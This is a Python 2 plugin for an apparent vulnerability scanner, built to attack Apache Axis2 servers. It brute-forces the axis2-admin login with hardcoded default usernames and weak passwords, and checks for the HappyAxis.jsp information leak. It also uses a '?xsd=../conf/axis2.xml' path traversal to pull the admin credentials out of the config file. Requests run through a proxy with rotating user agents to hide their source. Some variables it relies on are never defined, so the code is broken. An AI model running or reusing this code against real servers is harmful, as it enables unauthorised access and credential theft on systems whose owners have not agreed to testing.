#!/usr/bin/env python
# coding:utf-8
import logging
import lib.requests as requests
import random
import re
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def plugin_info():
    return {
        "name": "axis_vul",
        "info": "axis弱口令或信息泄漏",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def exploit(ip):
    result = []
    if Domain:
        for domain in Domain:
            try:
                url = domain+'/axis2/axis2-admin/'
                resp = requests.get(url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
            except Exception,e:
                logging.error(e)
                continue
            if "axis_l.jpg" in resp.text and resp.status_code == 200:
                result.append('%s/axis2/axis2-admin/ >>>> 存在axis管理口'%domain)
                flag_list=['Administration Page</title>','System Components','"axis2-admin/upload"','include page="footer.inc">','axis2-admin/logout']
                user_list=['axis','admin','manager','root']
                pass_list=['axis','axis2','123456','12345678','password','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
                for user in user_list:
                    for password in pass_list:
                        try:
                            login_url = domain+'/axis2/axis2-admin/login'
                            data = {'username':user, 'password':password, 'submit':'Login'}
                            resp = requests.post(login_url, data=data, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                        except Exception,e:
                            logging.error(e)
                            continue
                        for flag in flag_list:
                            if flag in resp.text:
                                result.append('%s >>>> 存在Axis弱口令%s:%s'%(domain,user,password))
            url = domain+"/axis2/axis2-web/HappyAxis.jsp"
            try:
                resp = requests.get(url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
            except Exception,e:
                logging.error(e)
            if "Axis2 Happiness Page" in resp.text:
                result.append('%s >>>> 存在Axis信息泄漏'%domain)
            url = domain+"/axis2/services/listServices"
            try:
                resp = requests.get(url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
            except Exception,e:
                logging.error(e)
            if resp.status_code == 200:
                m=re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>',resp.text)
                if m and m.group(1):
                    server_str = m.group(1)
                    url = domain+'/axis2/services/%s?xsd=../conf/axis2.xml'%(server_str)
                    resp = requests.get(url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                    if 'axisconfig' in resp.text:
                        try:
                            user=re.search('<parameter name="userName">(.*?)<\/parameter>',resp.text)
                            password=re.search('<parameter name="password">(.*?)<\/parameter>',resp.text)
                            result.append('%s >>>> 存在Axis任意文件包含%s:%s'%(url,user.group(1),password.group(1)))
                        except Exception,e:
                            logging.error(e)
        if len(result):
            return result